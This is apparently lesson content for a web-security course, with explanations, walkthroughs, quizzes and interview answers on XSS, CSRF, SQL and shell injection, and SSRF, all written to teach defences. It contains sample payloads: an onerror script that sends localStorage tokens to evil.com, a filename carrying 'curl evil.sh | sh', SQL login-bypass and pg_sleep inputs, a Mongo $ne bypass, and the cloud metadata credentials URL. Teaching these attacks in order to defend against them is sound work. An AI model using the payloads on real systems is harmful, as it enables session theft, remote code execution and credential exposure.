plain:
Cross-site scripting (XSS) happens when an attacker manages to get their JavaScript to run on your website, in other users' browsers. That script can do anything the user can: read data on the page, call your API as them, change what they see.

It usually comes from showing user-provided content as HTML without cleaning it.
bridge: React escapes text automatically, so {comment} is safe. The dangerous spots are dangerouslySetInnerHTML, innerHTML, rendering user Markdown as HTML, and user-provided URLs in href. React 19 blocks javascript: URLs, but React 18 and plain DOM code do not, so still allow only http: and https: links.

walk.title: How one comment attacks every visitor
steps: An attacker posts a comment: Nice post! <img src=x onerror="fetch('https://evil.com/?t='+localStorage.token)">.
Your server stores it. Your frontend renders comments with innerHTML.
Every visitor's browser tries to load the image, fails, and runs the onerror code.
Each visitor's token from localStorage is sent to the attacker.
Fix: render as text, or sanitise with DOMPurify if you must allow some HTML. Add a Content Security Policy as a second wall.

terms: Cross-site scripting: attacker script running on your site.
The payload is saved in your database and shown to others.
Turning < into < so it shows as text, not HTML.
Removing dangerous tags and attributes from HTML.
A header limiting which scripts may run.
insights: Treat every dangerouslySetInnerHTML as a security review point.
Markdown can contain raw HTML; sanitise after converting it.
XSS defeats most other protections (CSRF tokens, localStorage tokens), so it is worth extra care.

prod.summary: In a modern React or Next.js app, XSS rarely comes from {text}; it comes from the escape hatches: rich-text and Markdown rendering, dangerouslySetInnerHTML, user URLs, SVG uploads, server-rendered JSON in a <script> tag, and third-party scripts. Seniors grep for these sinks in every review and make sure a strict CSP limits what an injected script can do.
checklist: Every dangerouslySetInnerHTML, innerHTML, v-html and insertAdjacentHTML has a sanitizer (DOMPurify) right before it, or a comment explaining why the input is trusted.
User-provided URLs are parsed with new URL() and only http:/https: are allowed.
User-uploaded SVG and HTML files are served from a separate domain or with Content-Disposition: attachment, never inline from your app origin.
JSON embedded in HTML (<script>window.__DATA__ = …) is serialized with < escaped, so </script> in data cannot end the tag.
Session tokens are in HttpOnly cookies, not localStorage, so one XSS does not leak long-lived credentials.
An enforced nonce-based CSP is in place, and violation reports are monitored.
Lint rules catch sinks: react/no-danger, react/jsx-no-script-url.
numbers: XSS is in OWASP Top 10:2025 category A05 Injection (CWE-79).
React has warned about javascript: URLs since 16.9 (2019); React 19 blocks them.
DOMPurify's default config removes <script>, event handler attributes (onerror, onload) and javascript: URLs.
failures: Bug report: a user's profile shows an alert(1) box for every visitor.
Bio Markdown is converted to HTML and rendered unsanitized. Run DOMPurify on the HTML after Markdown conversion, and add a test with <img src=x onerror=alert(1)>.
Pentest: uploading avatar.svg with a <script> runs JS when the file URL is opened.
SVG is a document that can contain script. Serve uploads from a separate user-content domain, set Content-Disposition: attachment or convert SVG to PNG.
A product name containing </script><script>… breaks the page and runs code.

Server data was injected with JSON.stringify into an inline script. Escape < as \u003c (or use a serializer like serialize-javascript) or pass the data via a JSON <script type="application/json"> tag read with textContent.
CSP reports show script-src violations from cdn.unknown-analytics.io.

A third-party tag manager or browser extension injected a script. Check whether it comes from your tag manager first; if so, the marketing tag is the supply chain risk. Keep CSP enforced; do not widen it blindly.

code.title: Rendering user Markdown and links safely in React (Next.js)
code.note: Sanitize the HTML that comes out of the Markdown converter, because Markdown allows raw HTML. Use a sanitizer that also runs on the server: with plain dompurify, a server-rendered component crashes (no sanitize without a DOM).

qs.s: A Next.js page renders <a href={post.link}> where post.link comes from users. You are on React 19. A teammate says this is now completely safe. What is still a risk?
o: Nothing; React escapes all attributes
React 19 blocks javascript: URLs, but links to phishing or malware sites, and data: URLs in some contexts, still need validation; allowlist http(s)
Only images are risky
Next.js strips all user links
qs.e: React blocking javascript: removes the script-execution case, but a scheme allowlist is still good practice and protects older code paths and non-React renderers.

qs.s: Your app stores the access token in localStorage. A stored XSS is found and fixed within 2 hours. What else must you do?
o: Nothing, the bug is fixed
Clear users' localStorage
Add CSP and move on
Assume tokens were exfiltrated: revoke sessions/refresh tokens issued before the fix and check logs for unusual API use
qs.e: During those 2 hours, any visitor's token could have been sent to the attacker. Fixing the bug does not invalidate stolen tokens.

qs.s: Which of these is a DOM-based XSS?
o: el.innerHTML = new URLSearchParams(location.search).get('q') in client JS
A comment with a script tag saved in the database and shown to all users
A server template that prints ?q= into HTML without escaping
A malicious npm package that reads cookies
qs.e: In DOM-based XSS the server never sees or renders the payload; client code moves untrusted data from a source (the URL) into a sink (innerHTML). The saved comment is stored XSS; the server template printing ?q= is reflected XSS.

qs.s: Read this Next.js Server Component. q comes from the URL. Where is the XSS?

code.title: app/search/page.tsx

o: In the <h1>, because q is printed directly
In the inline script: JSON.stringify does not escape <, so a q containing </script> closes the tag and the rest is parsed as new HTML. Escape < as \u003c or pass data another way
Nowhere; JSON.stringify escapes quotes
In searchParams, which Next.js does not decode
qs.e: React escapes {q} inside the heading, so that part is safe. The HTML parser ends a script at the first </script, regardless of JavaScript quotes. Use a serializer that escapes <, or render the data as text in a type="application/json" script and read it with JSON.parse(el.textContent).

qs.s: After login, this client code redirects the user. Is there an XSS here, and what is the fix?

code.title: login-redirect.ts

o: Yes: a next value with the javascript: scheme runs code on your origin (and any other URL makes it an open redirect). Resolve with new URL(next, location.origin) and only follow it if its origin equals location.origin
No: browsers block javascript: in location.href
No: it is only an open redirect, which is harmless
Yes, but encoding next with encodeURIComponent fixes it
qs.e: Assigning a javascript: URL to location.href executes it in the current page. This is DOM-based XSS: the server never sees the payload. encodeURIComponent does not change the scheme check. Same-origin validation fixes both the XSS and the open redirect.

qs.s: A team debates where to clean user HTML for comments. Which approach is best?
o: Sanitize once when saving, then render the stored HTML anywhere
Escape on input with htmlspecialchars-style encoding and store the result
Do not sanitize; rely on CSP

Store what the user sent (validated for size and type), and sanitize or escape at output for the exact context (HTML, attribute, email, JSON). Input sanitizing can be an extra layer, but output is authoritative
qs.e: Safe encoding depends on where data ends up. HTML stored as “clean” today is wrong for an email template, a PDF or a future sanitizer rule. Escaping on input also corrupts data (& in exports). CSP is the second wall, not the first.

qs.s: You enable this header in a Chromium-based browser. What changes for this line of code?

code.title: Header and code

o: Nothing; Trusted Types only affects eval
The browser sanitizes the string automatically
The assignment throws a TypeError, because DOM sinks like innerHTML now accept only TrustedHTML objects created by a policy you define (for example one that calls DOMPurify)
The page stops loading all scripts
qs.e: Trusted Types turn every dangerous sink into a type check, so all HTML must pass through a small number of reviewed policies. The browser does not sanitize for you. Roll it out in report-only mode first, because third-party code often writes to innerHTML.

interview.q: Someone says our React app “cannot have XSS”. Convince me otherwise, then tell me how you would audit it.
answer: React escapes text children, but not: dangerouslySetInnerHTML, refs that set innerHTML, Markdown/rich text rendered as HTML, inline <script> data, SVG uploads served from your origin, and third-party scripts.
URLs: React 19 blocks javascript: in href, but location.href = …, window.open and older React versions do not.
Audit: grep for the sinks (dangerouslySetInnerHTML, innerHTML, insertAdjacentHTML, document.write, location assignments), trace each back to its source.
Add lint rules (react/no-danger), a strict CSP with reporting, and Trusted Types where possible.
Check what an XSS could steal: tokens in localStorage raise the impact a lot.
followups: How would you test the Markdown renderer?
What does a strict CSP not protect against?

interview.q: If an XSS does get through, what limits the damage?
answer: Strict CSP (nonce + strict-dynamic): injected <script> tags and inline handlers do not run.
Session in an HttpOnly cookie: the script can act as the user while the page is open, but cannot steal a long-lived credential.
Re-authentication for sensitive actions (change email, payout details), so a script cannot finish them silently.
Short token lifetimes and the ability to revoke sessions after the fix.
Honest limit: inside the page, a running script can do anything the user can; mitigations reduce the reach and the time, not the risk itself.
followups: Why do CSRF tokens not help against XSS?
How would you detect exploitation in logs?

interview.q: Users need rich text in comments: bold, links, images. How do you build it safely?
answer: Prefer a structured format (Markdown subset or an editor's JSON document) rendered by your own allowlist renderer, instead of accepting raw HTML.
If HTML is unavoidable, sanitize at render with DOMPurify using a tight allowlist of tags and attributes.
Links: allow only http(s), add rel="nofollow ugc noopener". Images: proxy them through your domain to avoid tracking and mixed content.
Serve uploads from a separate domain; never serve user SVG inline from the app origin.
Tests with known payload lists, plus CSP as the second wall.
followups: Why can sanitizing and then modifying HTML be dangerous?
How do you keep the sanitizer up to date?

one: A malicious site makes the user's browser send a request to your site, and the browser attaches the user's cookies automatically.
an: Someone tricks you into signing a document by sliding it under a stack of papers you are already signing.
how: Example: evil.com has a hidden form that POSTs to bank.com/transfer. Your bank cookie rides along; the bank sees a valid session.

Defences: explicit SameSite=Lax or Strict cookies, CSRF tokens (a secret per session included in forms or headers), checking the Origin or Sec-Fetch-Site header on state-changing requests, and never changing state with GET. SameSite works per site, so a compromised sibling subdomain (blog.example.com) is not blocked by it.
APIs authenticated purely by an Authorization header (not cookies) are not exposed, because browsers do not add that header automatically.
why: Any cookie-authenticated app that changes state is a candidate. Explicit defences are still needed because Firefox and Safari do not apply SameSite=Lax by default, SameSite=None setups have no protection, and a sibling subdomain counts as same-site.
trade: Moving tokens to localStorage to avoid CSRF trades it for XSS exposure. Cookies + SameSite + CSRF token is the usual balance.

myth.r: CORS controls reading responses. A simple form POST still reaches the server and executes; the attacker just cannot read the reply.

q.s: GET /account/delete?confirm=1 deletes the account (cookie auth). What attack does this enable?
o: SQL injection
Any site can embed that URL (e.g. in an img tag) and delete visitors' accounts
XSS
DDoS
q.e: State changes must not use GET. Use POST/DELETE with CSRF protection.

plain:
Cross-site request forgery (CSRF): a malicious website makes your browser send a request to another site where you are logged in. The browser automatically attaches your cookies, so the request looks legitimate.

SameSite cookies block most of this, but only Chrome and Edge apply SameSite=Lax when the attribute is missing. Set it explicitly and add a second check (an Origin/Sec-Fetch-Site check or a CSRF token) for state-changing requests.
bridge: It is the reason state-changing actions should never be GET links, and why frameworks like Next.js Server Actions check the Origin header for you.

walk.title: A forged money transfer
steps: You are logged in to bank.com (session cookie in your browser).
You visit cute-cats.com, which contains a hidden form posting to bank.com/transfer with “to: attacker, amount: 500”, submitted automatically.
If the cookie has no effective SameSite protection, your browser sends the POST with your bank cookie. The bank sees a valid session and transfers.
The attacker cannot read the response (the browser's same-origin policy blocks it), but the damage is already done.
Defences: explicit SameSite=Lax cookies, a CSRF token in forms, checking the Origin or Sec-Fetch-Site header, and never changing data with GET.

terms: Forcing a logged-in browser to send an unwanted request.
A secret value in forms that other sites cannot know.
Tells the server which site started the request.
Cookie setting that stops sending cookies on cross-site requests.
insights: CORS does not stop CSRF. CORS stops reading responses; CSRF only needs the request to arrive.
If your API accepts cookies, treat every state-changing route as a CSRF target until you can name the defence that covers it.
Sec-Fetch-Site gives a cheap server-side check with no token storage, and all major browsers now send it.

prod.summary: In production, CSRF protection is usually a framework feature (Rails, Django, Laravel tokens; Next.js Server Actions comparing Origin to Host) plus explicit SameSite cookies. The real bugs are the exceptions: custom API routes outside the framework's protection, GET handlers that change state, endpoints that accept form-encoded bodies, and setups that moved to SameSite=None.
checklist: Session cookies set SameSite=Lax (or Strict) explicitly; any SameSite=None cookie is a documented exception with a token or Origin check.
All state-changing routes use POST/PUT/PATCH/DELETE; no GET handler writes data (search for logout, unsubscribe, “confirm” links).
Custom route handlers (app/api/*/route.ts, Express routes) check Origin or Sec-Fetch-Site; framework protection often covers only forms or Server Actions.
JSON APIs reject text/plain and form-encoded bodies, so a plain HTML form cannot reach them.
Login and logout forms are protected too (login CSRF signs the victim into the attacker's account).
CORS does not reflect arbitrary origins with Access-Control-Allow-Credentials: true.
numbers: Sec-Fetch-Site (values same-origin, same-site, cross-site, none) is sent by all major browsers, including Safari since 16.4 (2023).
Chrome has applied Lax-by-default to cookies without a SameSite attribute since Chrome 80 (2020); Firefox and Safari do not.
OWASP Top 10:2025 maps CSRF (CWE-352) under A01 Broken Access Control.
failures: Users report they were logged out after visiting a forum.
Someone posted <img src="https://app.example.com/logout">. Logout is a GET. Make it POST with a CSRF check.
Pentest: cross-site form POST with enctype="text/plain" creates a record via your “JSON” API.
The body parser accepts any content type. Require Content-Type: application/json (which forces a CORS preflight cross-origin) and check Origin.
After moving the API to a different site and setting SameSite=None, a security scan flags CSRF on all endpoints.
None reopens the attack. Add a CSRF token or strict Origin allowlist on every state-changing request, or put the API under the same site (e.g. api.example.com).
Next.js Server Actions fail with an origin mismatch error behind a proxy.
The proxy rewrites Host or X-Forwarded-Host, so Origin and host no longer match. Fix the proxy headers or add the real origin to serverActions.allowedOrigins. Do not disable the check.

code.title: Origin / Fetch Metadata check for cookie-auth APIs
code.note: Rejecting same-site (not just cross-site) also blocks requests from a compromised sibling subdomain, which SameSite cookies cannot stop. If your app legitimately calls the API from another subdomain, allow same-site only together with the Origin allowlist.

qs.s: Your app is app.example.com with SameSite=Lax session cookies. An attacker controls an old promo.example.com page and makes it POST a form to app.example.com/api/transfer. Is the cookie sent?
o: No, SameSite blocks other subdomains
Yes: the two hosts are the same site, so SameSite does not apply; you need an Origin/Sec-Fetch-Site or token check
Only if CORS allows it
Only in Safari
qs.e: SameSite compares registrable domains, so subdomains count as same-site. Origin checks or tokens work per origin and close this gap.

qs.s: An API uses only Authorization: Bearer tokens stored in memory, with no cookies. A reviewer asks for CSRF tokens. Your answer?
o: CSRF tokens are not needed for this API, because browsers never attach the Bearer header automatically; XSS is the bigger risk for this design
Add CSRF tokens anyway, they are always required
Add SameSite to the Authorization header
Use GET for all requests to avoid preflights
qs.e: CSRF depends on ambient credentials the browser sends automatically (cookies, cached Basic auth). Bearer tokens set by JS are not ambient. The trade-off is that the token is reachable by any XSS.

qs.s: Which request is still a CSRF risk even with SameSite=Lax session cookies set explicitly?
o: A cross-site POST form to /transfer
A cross-site fetch with credentials: 'include'
A cross-site iframe loading /settings
A link on another site to GET /account/delete?confirm=1, because Lax still sends cookies on top-level GET navigation
qs.e: Lax allows cookies on top-level navigations with safe methods. That is why GET must never change state.

qs.s: The session cookie has no SameSite attribute. A Safari user visits an attacker page that sends this request. The server uses express.json({ type: '*/*' }). What happens?

code.title: Captured request
code.src:
POST /api/settings/email HTTP/1.1
Host: app.example.com
Origin: https://attacker.example
Sec-Fetch-Site: cross-site
Content-Type: text/plain
Cookie: sid=9fJ2...

{"email":"attacker@attacker.example"}

o: Nothing; the browser sends a CORS preflight first and the server rejects it
The request fails because the body is not valid JSON
The email is changed: text/plain needs no preflight, Safari sends the cookie, and the parser reads the body as JSON. Require application/json, check Origin/Sec-Fetch-Site, and set SameSite explicitly
The attacker can also read the response
qs.e: Simple requests (form content types and text/plain) skip the preflight, so they reach the server with cookies. The parser accepting any content type turns that into a JSON API call. The attacker still cannot read the response (no CORS), but the write already happened.

qs.s: Read this CSRF protection. What is its main weakness?

code.title: csrf.ts

o: The token is readable by JavaScript, so any attacker site can read it
It should compare with ==
It blocks GET requests

It is a naive double-submit: anyone who can write a cookie for your domain (a compromised sibling subdomain, cookie tossing) can set a matching cookie and header. Bind the token to the session with an HMAC (signed double-submit) or keep it server-side
qs.e: Other sites cannot read your cookies, so “any attacker site can read the token” is wrong. But they may be able to set one. OWASP recommends the signed double-submit cookie: the token is HMAC(secret, sessionId + random), so a planted value does not verify. Also note: if neither cookie nor header is present, undefined !== undefined is false and the request passes; reject missing tokens explicitly.

qs.s: An attacker's page auto-submits your login form with the attacker's own username and password. The victim's later searches and saved cards end up in the attacker's account. What protects against this?
o: CSRF protection on the login form too (a pre-session token or an Origin / Sec-Fetch-Site check), because login is a state change
Nothing is needed: the attacker only logs in to their own account
Rate limiting the login endpoint
HttpOnly on the session cookie
qs.e: This is login CSRF. The victim does not notice they are logged in as someone else, and their actions become visible to the attacker. Rate limits and HttpOnly do not stop a single forged form post.

qs.s: An Express API uses this CORS setup with cookie sessions. What is the problem?

code.title: server.ts

o: Nothing; reflecting the origin is the same as *
Any website can send credentialed requests and read the responses, including preflighted JSON and DELETE calls. Use an explicit origin allowlist
It only breaks preflight caching
Browsers ignore credentials: true unless SameSite=None
qs.e: * is not allowed with credentials, which is why reflecting is used, and it is much worse: it removes the same-origin read protection for every site. CSRF lets attackers write; this lets them read user data too. (Cookies still follow SameSite rules, but same-site attackers and None cookies are covered.)

interview.q: Browsers have SameSite cookies now. Do we still need CSRF tokens?
answer: SameSite=Lax set explicitly blocks most cross-site form posts, but it does not cover: Firefox and Safari when the attribute is missing, SameSite=None cookies, same-site attackers (sibling subdomains), and GET handlers that change state.
Lightweight second check: reject state-changing requests where Sec-Fetch-Site is not same-origin (or none), falling back to an Origin allowlist.
Tokens (synchronizer or signed double-submit) when you must support same-site cross-origin calls or old clients, or when the framework gives them for free.
Keep GET safe, require JSON content types on APIs, and protect login and logout too.
So: SameSite plus Origin/Fetch Metadata is often enough; tokens are the belt-and-braces option.
followups: How do Next.js Server Actions protect against CSRF?
What breaks when you reject same-site requests?

interview.q: The same JSON API is used by our SPA with cookies and by mobile apps with bearer tokens. How do you protect it from CSRF?
answer: CSRF only matters for credentials the browser attaches automatically, so apply checks to cookie-authenticated requests only.
For cookie requests: SameSite=Lax, Origin/Sec-Fetch-Site check, and require Content-Type: application/json so a form cannot reach the API without a preflight.
For bearer requests: no CSRF check is needed, but make sure a request cannot carry both and be treated as the weaker one.
CORS: exact allowlist, credentials only for your web origin.
Test it: an automated cross-site form post and a text/plain fetch in CI should both fail.
followups: What if a browser extension or old client does not send Origin?
Would you put the CSRF token in a header or the body?

interview.q: Explain why CORS is not a CSRF defence, and when a CORS setting makes things worse.
answer: CORS decides whether the calling page may read a cross-origin response, and whether non-simple requests are allowed after a preflight.
A simple request (form post, text/plain fetch) is sent and executed before any CORS check; only the response is hidden.
So CSRF needs server-side checks; CORS headers alone never block a simple request.
CORS makes it worse when it reflects any origin with credentials, or trusts null or regex-matched origins like *.example.com.evil.net: then attackers can also read data and send preflighted requests.
Keep a static allowlist and test it with an untrusted Origin.
followups: Which requests are “simple”?
Why is the null origin dangerous to allow?

one: Untrusted input gets interpreted as code: SQL, shell commands, LDAP, template expressions.
an: Filling in "Name: Bob; also give Bob the safe combination" on a form, and the clerk reads the whole line as an instruction.
how: Vulnerable: db.query("SELECT * FROM users WHERE email = '" + email + "'"). Input ' OR '1'='1 returns every user.
Fix: parameterised queries: db.query("... WHERE email = $1", [email]). The DB treats the value as data, never as SQL. ORMs do this by default, except in raw-query escape hatches.
Same idea everywhere: no string-building shell commands (use argument arrays), no eval, no user-controlled template code. Prompt injection is the LLM-era cousin.
why: Still one of the most damaging vulnerability classes: full database dumps.
trade: Identifiers (table/column names, sort direction) cannot be parameterised; validate them against an allowlist.

myth.r: Escaping has edge cases (encodings, numeric contexts). Parameterisation removes the problem class.

q.s: A sort parameter goes directly into ORDER BY ${sort}. You cannot bind identifiers as parameters. Fix?
o: Escape quotes
Map allowed values to known column names (allowlist), reject everything else
Hide the parameter
Use GraphQL
q.e: Allowlisting is the standard defence for dynamic identifiers.

more: Least-privilege DB users to limit damage
lab: Build a deliberately vulnerable login query with string concatenation and bypass it with ' OR '1'='1.
Fix with parameters and confirm the same input fails.
Do PortSwigger's free SQL injection labs.

plain:
Injection happens when user input is glued into a command (SQL, shell, etc.) as text, and the input is crafted to change the command's meaning.

The fix is to never build commands by joining strings with user input. Send the input separately as a parameter, so the database always treats it as data.
bridge: It is like the difference between element.innerHTML = userText (dangerous) and element.textContent = userText (safe). Parameters are the textContent of SQL.

walk.title: Logging in without a password
steps: Code: query("SELECT * FROM users WHERE email = '" + email + "' AND password_hash = '...'").
Attacker types email: admin@shop.com' --.
The final SQL becomes ... WHERE email = 'admin@shop.com' --' AND password_hash = .... Everything after -- is a comment.
The password check disappears. The attacker is logged in as admin.
Fix: query('SELECT * FROM users WHERE email = $1', [email]). The quote is now just a character in an email that does not exist.

terms: Untrusted input interpreted as code or commands.
SQL with placeholders; values sent separately.
Accepting only known-good values (e.g. for sort columns).
The same idea against LLMs: input that changes the instructions.
insights: ORMs protect you only through their normal APIs; raw-query escape hatches with string building are still vulnerable.
Database error text sent to clients helps attackers confirm and shape an injection. Log the error, return a generic message.
Give the app's database user minimal rights, so a successful injection cannot drop tables.

prod.summary: In production code, SQL injection hides in the places the ORM cannot help: raw-query escape hatches, dynamic ORDER BY and column names, IN (...) lists built by hand, search filters, and reporting tools. Seniors grep for string-built SQL in every review and make sure the database user cannot do more than the app needs, so one injection is not a full takeover.
checklist: No SQL is built with + or template strings containing user input; search for $queryRawUnsafe, sequelize.query(`, knex.raw(` and .query(` with ${.
Dynamic identifiers (sort column, direction, table) come from a fixed map in code, never from the request string.
IN lists use array parameters (Postgres = ANY($1)), not joined strings.
LIKE patterns escape % and _ in user input (not an injection, but it changes the meaning and can cause slow scans).
The app DB role does not own tables, has no superuser rights, and cannot read other schemas (limits damage).
Shell commands use argument arrays (execFile/spawn), never exec with a built string.
NoSQL filters are validated by schema, so { "$ne": null } cannot arrive where a string is expected.
numbers: Injection is A05 in the OWASP Top 10:2025 (it was A03 in 2021) and includes XSS (CWE-79) and SQL injection (CWE-89).
PostgreSQL bind parameters use $1, $2…; one statement can have up to 65,535 parameters, which large bulk inserts can hit.
A time-based blind injection (pg_sleep(5)) shows up as requests that take exactly the injected delay; watch for p99 latency spikes on search endpoints.
failures: Error logs show syntax error at or near "'" from the search endpoint, from many IPs.
Someone is probing for injection, and the error proves the input reaches SQL as code. Parameterize the query now; also stop returning DB error text to clients.
The admin report endpoint is slow for some inputs, taking exactly 5 or 10 seconds.
Time-based blind injection ('; SELECT pg_sleep(10)--) in a raw query. Parameterize, then check DB logs for what else was run with that pattern.
Login bypass on a MongoDB app with body { "email": "a@b.c", "password": { "$ne": "x" } }.
Operator injection: the body object was passed straight into the filter. Validate types with a schema (password must be a string) and compare hashes in code.
Bulk import fails with a protocol or bind error once one batch has more than about 65,000 values.
Over the Postgres 65,535-parameter limit per statement. Batch the insert into chunks or use unnest($1::text[], $2::int[]) / COPY instead of building SQL text.

code.title: Parameters for values, allowlist for identifiers (node-postgres)
code.note: The only interpolated piece, orderBy, can only be one of two strings written in your code. Everything from the user goes through $1–$3.

qs.s: A developer fixes an injection by changing db.$queryRawUnsafe(`... WHERE name = '${name}'`) to db.$queryRawUnsafe(`... WHERE name = '${name.replace(/'/g, "''")}'`). What is the better fix in Prisma?
o: Also escape backslashes
Use the tagged template db.$queryRaw`... WHERE name = ${name}`, which sends name as a bind parameter
Use a regex to block the word SELECT
Wrap it in a transaction
qs.e: Prisma's tagged $queryRaw turns template values into parameters. Manual escaping depends on the database, encoding and context, and blocklists are always bypassed.

qs.s: An attacker finds a SQL injection in a read-only search endpoint. The app connects as the table owner role. Which extra damage does least privilege prevent?
o: None; SQL injection is always total
Reading the searched table
Slow queries
DROP TABLE, ALTER and reading unrelated schemas, if the app role does not own the tables and has only the grants it needs
qs.e: Parameterization is the fix; least privilege limits the blast radius when a bug slips through. In Postgres, only the owner (or a superuser) can drop or alter a table.

qs.s: Node code runs exec(`convert ${req.body.file} out.png`). A user sends a.jpg; curl evil.sh | sh. Which change fixes it?
o: execFile('convert', [file, 'out.png']) after validating file against an allowed path pattern
Wrap the filename in double quotes
Escape semicolons only
Run it inside try/catch
qs.e: execFile passes arguments directly to the program without a shell, so ;, | and $() have no special meaning. Quoting and escaping by hand miss cases like $(…) and backticks.

qs.s: Read this Prisma query. userId is passed as a parameter. Is it safe?

code.title: posts.ts

o: Yes; using $1 makes the whole query parameterized
Yes; ORDER BY cannot contain anything dangerous
No: sort is pasted into the SQL text. ORDER BY accepts expressions and subqueries, which allows blind data extraction. Map sort to a fixed set of column strings
No, but only because it can cause a syntax error
qs.e: Parameters protect only the values bound to them. Anything interpolated into the string is code. ORDER BY injection is a well-known blind technique: an attacker sorts by a condition (for example a CASE on a secret value) and watches the order change. Identifiers need an allowlist.

qs.s: The signup code is fully parameterized. This nightly job fails for one user. What does the log show?

code.title: nightly-report.log
code.src:
03:00:02 job=nightly-report user_id=8812
ERROR: syntax error at or near "s"
QUERY: SELECT * FROM audit WHERE display_name = 'O'Neil's shop'

o: Second-order injection: data saved safely earlier is pasted into SQL later by another piece of code. Data from your own database is still untrusted; parameterize the job's query
A bad display name; add validation that forbids apostrophes
A database bug in quote handling
Harmless, because the job runs at night with no user present
qs.e: The quote broke the SQL, which proves the value is interpreted as code. A crafted name could do much more, with the job's (often higher) privileges. Banning apostrophes breaks real names and misses other payloads; the fix is parameters everywhere.

qs.s: A search uses pool.query('SELECT * FROM products WHERE name ILIKE $1', ['%' + q + '%']). Which statement is correct?
o: It is injectable, because the % signs are concatenated
It is safe and fast
It is safe only if q is URL-encoded
It is not injectable, but % and _ in q act as wildcards (escape them if they should be literal), and the leading % stops a normal B-tree index, so the query scans the table. A pg_trgm GIN index helps
qs.e: Building the value before binding is fine; it still travels as data. The real issues are meaning (wildcards) and performance. On a big table, a sequential scan per keystroke can take down the database, so it can become a denial-of-service path.

qs.s: Read this API. Only id and email are returned. What can an attacker still do?

code.title: routes/users.ts

o: Nothing; Prisma always parameterizes values

Filter on fields that are not returned, such as passwordHash with startsWith, and learn the secret one character at a time from which users come back; or filter on relations from other tenants. Build where from validated, allowlisted fields
Only cause a JSON parse error
Run raw SQL through the filter
qs.e: This is operator injection: no SQL is executed, but the attacker controls the query's logic. Each request answers a yes/no question about hidden data. Validate the filter with a schema that allows only the fields and operators the UI needs.

interview.q: “We use an ORM, so we cannot have SQL injection.” What do you answer?
answer: The normal ORM API parameterizes values, which removes most classic injection.
Escape hatches are still risky: raw queries with string building ($queryRawUnsafe, knex.raw, sequelize.query), dynamic column or sort names, and raw fragments in whereRaw/orderByRaw.
Logic injection: passing request objects straight into where lets attackers add operators and filter on hidden fields.
Other interpreters: shell commands, NoSQL operators, template engines, LDAP, and prompts sent to LLMs.
Controls: lint or grep rules for raw query APIs in CI, code review focus on dynamic identifiers, a least-privilege DB role, and parameter-only helpers.
followups: How would you allow a user-chosen sort column safely?
What lint rule would you add?

interview.q: How do you find and fix SQL injection across a large legacy codebase?
answer: Inventory sinks: grep for raw query calls and string building near SQL keywords; use SAST (Semgrep, CodeQL) with taint tracking from request input.
Prioritise by exposure: unauthenticated endpoints, then admin and reporting tools, then batch jobs (second-order).
Fix pattern by pattern: parameters for values, allowlists for identifiers, array parameters (= ANY($1)) for IN lists.
Prevent regressions: a CI rule that fails on new raw-query string interpolation, and tests with quote characters in inputs.
Reduce impact meanwhile: least-privilege DB roles, no DB error text in responses, WAF rules as a temporary shield, alerts on SQL syntax errors in logs.
followups: Would you trust a WAF to stop injection?
How would you find second-order injection?

interview.q: An injection was exploited. What decides how bad it is, and how would you design database access so the next one hurts less?
answer: Impact depends on the DB role: what it can read (other schemas, other tenants), write, drop, or execute (e.g. COPY … PROGRAM for superusers).
Design: the app role owns nothing and has only DML grants; migrations use a separate owner role; analytics use read-only roles.
Tenant isolation with RLS means an injection in one tenant's request sees less data.
Secrets (tokens, keys) encrypted at the application layer stay useless in a dump.
Detection: alert on SQL errors, unusual query volume, long or sleep-like queries (pg_stat_statements, DB audit logs).
followups: Which Postgres privileges let a role run OS commands?
How do you prove what data was read?

one: SSRF tricks your server into making requests to places the attacker cannot reach directly. The OWASP Top 10 is the industry's list of the most common web risks.
an: Asking the receptionist to "just fetch this file from room 12", where room 12 is the vault only staff can enter.
how: A feature fetches a user-provided URL (link previews, “import from URL”, webhooks, PDF generators that load images). The attacker submits http://169.254.169.254/ (cloud metadata service, which may hand out credentials) or http://localhost:6379.

Defences: allowlist destinations when you can; otherwise resolve DNS and block private, loopback and link-local ranges at connect time (so redirects and DNS rebinding are covered), allow only http(s), use IMDSv2 on AWS, and run fetchers in an isolated network or behind an egress proxy.

OWASP Top 10:2025: A01 Broken Access Control (now includes SSRF), A02 Security Misconfiguration, A03 Software Supply Chain Failures, A04 Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08 Software or Data Integrity Failures, A09 Security Logging and Alerting Failures, A10 Mishandling of Exceptional Conditions.
why: SSRF has caused major cloud breaches (the 2019 Capital One breach used SSRF to reach the AWS metadata service). The Top 10 is the shared checklist for reviews and interviews.
trade: URL-fetching features are convenient and risky. Treat them as security-sensitive code by default.

myth.m: Internal services do not need auth because they are not exposed.
myth.r: SSRF turns your own server into the attacker's entry point to them.

q.s: Your link-preview feature fetches any URL a user posts. What should it block at minimum?
o: Large images only
Private, loopback and link-local addresses (e.g. 10.x, 127.x, 169.254.x), checked after DNS resolution and on redirects
HTTPS URLs
Nothing
q.e: Checking only the hostname string fails against DNS tricks and redirects.

lab: Build a link-preview endpoint that fetches any URL. Point it at http://localhost:6379 or another local service and see what leaks.
Fix it: resolve the hostname, block private ranges at connect time, re-validate redirects, set a timeout and a size limit.
Read the OWASP Top 10:2025 list in full and map each item to something in your own app.

plain:
SSRF (server-side request forgery): your server fetches a URL that a user provides, and the user points it at something private that only your server can reach, like internal admin services or the cloud's secret metadata endpoint.

The OWASP Top 10 is the industry's list of the ten most important web security risks. SSRF had its own entry in 2021; in the 2025 edition it is part of A01 Broken Access Control.
bridge: Link previews (pasting a URL and seeing a card), “import image from URL” and webhooks you send to user URLs are all SSRF-shaped features.

walk.title: A link preview that leaks cloud credentials
steps: Your chat app shows previews: the server fetches any URL a user posts and reads its title.
An attacker posts http://169.254.169.254/latest/meta-data/iam/security-credentials/.
That address only works from inside the cloud. Your server can reach it, and it returns temporary cloud credentials.
Your preview shows them to the attacker, who now has your server's cloud permissions.
Fix: resolve the hostname, block private and internal IP ranges, re-check after redirects, and use IMDSv2 on AWS.

terms: Tricking a server into making requests for the attacker.
A cloud-internal URL that gives instances information and credentials.
Addresses like 10.x, 172.16–31.x, 192.168.x, 127.x not reachable from the internet.
A widely used list of top web security risks.
insights: If a feature only needs a few known destinations (your CDN, partner APIs), an allowlist beats any blocklist.
Make outbound requests boring: one shared hardened client or egress proxy, so a new feature cannot quietly use plain fetch().
Internal services without authentication become exposed through SSRF; authenticating internal calls limits what a successful SSRF can do.

